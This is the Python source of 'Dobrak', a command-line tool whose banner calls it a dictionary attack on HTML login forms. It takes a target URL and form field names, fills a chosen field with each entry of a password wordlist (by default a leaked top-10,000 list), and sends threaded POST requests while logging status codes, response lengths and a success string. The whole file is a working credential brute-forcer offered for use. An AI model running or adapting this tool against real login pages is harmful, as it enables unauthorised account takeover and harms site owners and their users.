#!/usr/env python3
# -*- encode: utf-8 -*-

''' Importing Modules '''
import platform, os, time
import requests, colored
from threading import Thread


''' GLOBAL VARIABLE '''
target_url = ''
list_fields = []
list_values = []
temp_crafted_data = {}
craft_data = {}
wordlist_path = ''
n_passphrase = 0
specific_string = ''
dobraked = ''
threading = 10
filename = ''
''' COLORING '''
	# for Style
cl_reset = colored.style.RESET
cl_bold = colored.attr("bold")
	# for Foreground
clfg_w = colored.fore.WHITE
clfg_r = colored.fore.LIGHT_RED
clfg_lg = colored.fore.LIGHT_GREEN
clfg_y = colored.fg(227)
clfg_b = colored.fore.BLUE
	# for Background
cl_bg_white = colored.back.WHITE
cl_bg_red = colored.back.LIGHT_RED
cl_bg_lgreen = colored.back.LIGHT_GREEN
cl_bg_yellow = colored.bg(227)
''' SETUP VARIABLE '''
sign_info = "{0}[{1}i{0}]".format(clfg_w,clfg_b)
sign_plus = "{0}[{1}+{0}]".format(clfg_w,clfg_lg)
sign_minus = "{0}[{1}-{0}]".format(clfg_w,clfg_r)
sign_proc = "{0}[*]".format(clfg_w)
sign_warn = "{0}[{1}!{0}]".format(clfg_w,clfg_r)
sign_input = "{0}[{1}>{0}]".format(clfg_w,clfg_y)
''' Save File '''
filename = time.strftime("%Y%m%d-%H%M%S") + ".txt"
buka_simpanan = open(f'./temp/{filename}','a')
def save_text(text):
	buka_simpanan.write(text+"\n")


banner = r'''{0}{1}
 ██████╗  ██████╗ ██████╗ ██████╗  █████╗ ██╗  ██╗
 ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
 ██║  ██║██║   ██║██████╔╝██████╔╝███████║█████╔╝ 
 ██║  ██║██║   ██║██╔══██╗██╔══██╗██╔══██║██╔═██╗ 
 ██████╔╝╚██████╔╝██████╔╝██║  ██║██║  ██║██║  ██╗
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
 Coded by {2}Muhammad Rizky{1} [{2}XECTE-7{1}]
 version {2}1.0{1}

 Dobrak: This tool used to perform dictionary/attack
         on HTML <form> using HTTP request (POST/GET){0}
'''.format(cl_reset, clfg_w, clfg_r)


''' Sending Request '''
def send_request(url, final_craft_data,passphrase):
	# Sending POST data
	try:
		send_data = requests.post(url, data=final_craft_data)
		# For Res Text
		if send_data.status_code == 200:
			text_res = f"{clfg_w}{send_data.status_code}"
		else:
			text_res = f"{clfg_y}{send_data.status_code}"
		# For Len Text
		digit_len = len(str(len(send_data.text)))
		whitespace_left = 6 - digit_len
		if whitespace_left > 0:
			text_len = f"{len(send_data.text)}" + (" "*whitespace_left)
		else:
			text_len = f"{len(send_data.text)}"
		# For String Text
		text_str = ''
		text_str_ori = ''
		if specific_string == '' or specific_string == ' ':
			text_str = "      "
		else:
			if specific_string in send_data.text:
				text_str = f"{clfg_w}  OK  "
				text_str_ori = f"  OK  "
			else:
				text_str = f"{clfg_y}  --  "
				text_str_ori = f"  --  "
		# For URL Text
		text_url = ''
		text_url_ori = ''
		if target_url == send_data.url:
			text_url = f"{clfg_w} S "
			text_url_ori = f" S "
		else:
			text_url = f"{clfg_y} D "
			text_url_ori = f" D "
		# For Passphrase Text
		text_passphrase = ''
		text_passphrase_ori = ''
		whitespace_left = 20 - len(passphrase)
		if whitespace_left > 0:
			text_passphrase = f"{passphrase}" + (" "*whitespace_left) + f" {clfg_lg}|"
			text_passphrase_ori = f"{passphrase}" + (" "*whitespace_left) + f" |"
		else:
			text_passphrase = f"{passphrase}"
		#print(f"{craft_data}")
		print(f"{clfg_lg}| {text_res}{clfg_lg} | {clfg_w}{text_len}{clfg_lg} | {text_str}{clfg_lg} | {text_url}{clfg_lg} | {clfg_w}{text_passphrase}")
		save_text(f"| {send_data.status_code} | {text_len} | {text_str_ori} | {text_url_ori} | {text_passphrase_ori}")
	except requests.exceptions.Timeout:
		print(f"{clfg_lg}| {clfg_w}TMO{clfg_lg} | {clfg_w}------{clfg_lg} | {clfg_w}------{clfg_lg} | {clfg_w}---{clfg_lg} | {clfg_w}{text_passphrase}")
		save_text(f"| TMO | ------ | ------ | --- | {text_passphrase}")
	except KeyboardInterrupt:
		print(f"{clfg_lg}+-----+--------+--------+-----+----------------------+")
		save_text(f"+-----+--------+--------+-----+----------------------+")
		buka_simpanan.close()
		exit()


''' Attack Phase '''
def attacking():
	global craft_data, buka_simpanan
	# Summary
	print(f"{sign_info} Information Summary :")
	#print(" |")
	print(f" +---> Target URL      : {clfg_lg}{target_url}{cl_reset}")
	print(f" +---> Request Data    : {clfg_lg}{temp_crafted_data}{cl_reset}")
	#print(f" +---> Dobrak          : {dobraked}")
	print(f" +---> Wordlist        : {clfg_lg}{wordlist_path}{cl_reset}")
	print(f" +---> Passphrase      : {clfg_lg}{n_passphrase}{cl_reset}")
	print(f" +---> Specific String : {clfg_lg}{specific_string}{cl_reset}")
	print(f" +---> Thread          : {clfg_lg}{str(threading)}{cl_reset}")
	print()
	# Save to file
	save_text(f"[i] Information Summary :")
	save_text(f" +---> Target URL      : {target_url}")
	save_text(f" +---> Request Data    : {temp_crafted_data}")
	save_text(f" +---> Dobrak          : {dobraked}")
	save_text(f" +---> Wordlist        : {wordlist_path}")
	save_text(f" +---> Passphrase      : {n_passphrase}")
	save_text(f" +---> Specific String : {specific_string}")
	save_text(f" +---> Thread          : {str(threading)}")
	# Confirmation
	confirm = input(f"{clfg_w}[{clfg_y}Press ENTER to confirm attack{clfg_w}]\n")
	# Opening Wordlist
	buka_wlist = open(wordlist_path, 'r', encoding='utf-8')
	# Output Frame
	whitespace_left = 20 - len(dobraked)
	if whitespace_left > 0:
		str_dobraked = f"{dobraked}" + (" "*whitespace_left) + f" {clfg_lg}|"
		str_dobraked_ori = f"{dobraked}" + (" "*whitespace_left) + f" |"
	else:
		str_dobraked = dobraked
		str_dobraked_ori = dobraked
	print(f"{clfg_lg}+-----+--------+--------+-----+----------------------+")
	print(f"{clfg_lg}| {clfg_w}Res{clfg_lg} | {clfg_w}Length{clfg_lg} | {clfg_w}String{clfg_lg} | {clfg_w}URL{clfg_lg} | {clfg_w}{str_dobraked}{cl_reset}")
	print(f"{clfg_lg}+-----+--------+--------+-----+----------------------+")
	# Save to file
	save_text(f"+-----+--------+--------+-----+----------------------+")
	save_text(f"| Res | Length | String | URL | {str_dobraked_ori}")
	save_text(f"+-----+--------+--------+-----+----------------------+")
	# Managing Passphrase
	passphrase_list = buka_wlist.readlines()
	indexer = 0
	while indexer < len(passphrase_list):
	#for passphrase in buka_wlist.readlines():
		try:
			# Sending request
			thread_list = []
			for n in range(1, threading+1):
				passphrase = passphrase_list[indexer].strip('\n')
				# Crafting Data
				craft_data = {}
				for i in range(len(list_fields)):
					if list_values[i-1] == '{dobrak}':
						craft_data[list_fields[i-1]] = passphrase
					else:
						craft_data[list_fields[i-1]] = list_values[i-1]
				t = Thread(target=send_request, args=(target_url,craft_data,passphrase,))
				thread_list.append(t)
				t.start()
				indexer += 1
				#send_request(target_url,craft_data,passphrase)
			for t in thread_list:
				t.join()
		except KeyboardInterrupt:
			time.sleep(threading / 10)
			print(f"+-----+--------+--------+-----+----------------------+")
			print(f"\n{sign_warn} Operation canceled by user\n")
			save_text(f"+-----+--------+--------+-----+----------------------+")
			save_text("\n[!] Operation canceled by user\n")
			buka_wlist.close()
			buka_simpanan.close()
			exit()
	print(f"+-----+--------+--------+-----+----------------------+")
	save_text(f"+-----+--------+--------+-----+----------------------+")
	buka_wlist.close()
	buka_simpanan.close()


''' Filling information '''
def fill_info():
	# Variables
	global target_url, list_fields, list_values,wordlist_path, n_passphrase, specific_string, threading, dobraked
	global temp_crafted_data
	# Getting and checking given URL
	target_url = str(input(f"{sign_input} Enter target URL : {clfg_lg}"))
	if target_url == '' or target_url == None:
		print(f"{sign_warn} Please specify the target URL")
		input(f"{clfg_w}[Press any key to continue ->]\n")
		fill_info()
	else:
		# Need to specify http:// or https://
		if 'http://' not in target_url and 'https://' not in target_url:
			print(f"{sign_warn} Please specify the 'http://' or 'https://'")
			input("{clfg_w}[Press any key to continue ->]\n")
			fill_info()
		else:
			# Checking HTTP response
			print(f"{sign_proc} Checking page response..")
			try:
				r = requests.get(target_url)
				if r.status_code != 200:
					print(f"{sign_warn} Can't perform any action on this page || HTTP response code {r.status_code}")
					input(f"{clfg_w}[Press any key to refill..]\n")
					fill_info()
				else:
					print(f"{sign_plus} Further action can be performed || HTTP response code {r.status_code}")
			except requests.exceptions.ConnectionError:
				print(f"{sign_warn} Error - ConnectionError: Please check your internet connection or target")
				input(f"{clfg_w}[Press any key to refill..]\n")
				fill_info()
			except requests.exceptions.Timeout:
				print(f"{sign_warn} Error - Timeout: Please check your internet connection or target")
				input(f"{clfg_w}[Press any key to refill..]\n")
				fill_info()
			except requests.exceptions.TooManyRedirects:
				print(f"{sign_warn} Error - TooManyRedirects: We got too many rediects from target")
				input(f"{clfg_w}[Press any key to refill..]\n".format(clfg_w))
				fill_info()
			except requests.exceptions.HTPPError:
				print(f"{sign_warn} Error - Rare invalid HTTP response")
				input(f"{clfg_w}[Press any key to refill..]\n")
				fill_info()
	# Inserting request key/parameter
	print()
	print(f"{sign_info} Enter the fields name and values below.")
	print(f" |  Field name can be found at the 'name' attribute of the <input> tag.")
	print(f" |  Tampering the request data will give you more accurate field name used.")
	print(f'[x] Ex: <input type="text" name="username"> so the field name is "username"')
	print(f'[x] Ex: <input type="submit" value="Login" name="Login"> so the field name is "Login" with value "Login"')
	print(f"{sign_info} For the field you want to perform attack, fill the value with "+"{dobrak}")
	print(f"{sign_info} To finish, leave the field name blank")
	print(f" |")
	param_counter = 1
	while True:
		# Field
		param_input = str(input(f"{sign_input} Field-{param_counter} : {clfg_lg}"))
		if param_input == '' or param_input == None:
			print(" |")
			print(f"{sign_proc} {param_counter-1} fields will be used for crafting request data")
			break
		else:
			list_fields.append(param_input)
			# Value
			value_input = str(input(f"{clfg_w} ╰┈> Value for '{list_fields[param_counter-1]}' : {clfg_lg}"))
			# Try converting to Integer
			try:
				int(value_input)
			except ValueError:
				# Try converting to Boolean
				try:
					bool(value_input)
				# Store as string (default)
				except ValueError:
					str(value_input)
			list_values.append(value_input)
			# Increment
			param_counter += 1
	# Crafting request data
	for i in range(len(list_fields)):
		if list_values[i-1] == '{dobrak}':
			dobraked = list_fields[i-1]
		temp_crafted_data[list_fields[i-1]] = list_values[i-1]
	# Temporary crafted request data
	print(f"{sign_plus} Crafted request data : {temp_crafted_data}")
	# Wordlist
	print()
	wordlist_path = str(input(f"{sign_input} Wordlist [default=darkweb2017-top10000.txt] : {clfg_lg}"))
	print(f"{sign_proc} Checking file availability..")
	if wordlist_path == '' or wordlist_path == None:
		wordlist_path = './wordlists/darkweb2017-top10000.txt'
		try:
			buka_wlist = open(wordlist_path, 'r', encoding='utf-8')
			print(f"{sign_plus} Using default wordlist at {wordlist_path}")
		except IOError:
			print(f"{sign_warn} Couldn't read the file : {wordlist_path}")
			print("    File is not exist or size is too big")
	else:
		try:
			buka_wlist = open(wordlist_path, 'r', encoding='utf-8')
			print(f"{sign_plus} Using wordlist at {wordlist_path}")
		except IOError:
			print(f"{sign_warn} Couldn't read the file : {wordlist_path}")
			print("    File is not exist or size is too big")
	# Using any specific identifier
	print()
	print(f"{sign_info} Add specific string to identify different result or behavior on the page")
	print(" |  when performing attack (ex: Login failed). If there's nothing, leave it blank")
	specific_string = str(input(f"{sign_input} Specific string : {clfg_lg}"))
	if specific_string == '' or specific_string == ' ':
		pass
	else:
		print(f"{sign_plus} Using specific string : {specific_string}")
	# Threading
	print()
	try:
		threading = int(input(f"{sign_input} Number of thread [default=10] : {clfg_lg}"))
	except:
		threading = 10
	print(f"{sign_plus} Using {threading} thread")
	# Changing Function
	print()
	n_passphrase = len(buka_wlist.readlines())
	buka_wlist.close()
	attacking()


''' Main function of the program '''
def utama():
	if platform.system() == 'Windows':
		os.system('cls')
	else:
		os.system('clear')
	print(banner)
	fill_info()
	
''' Calling the main function of the program '''
if __name__ == '__main__':
	utama()
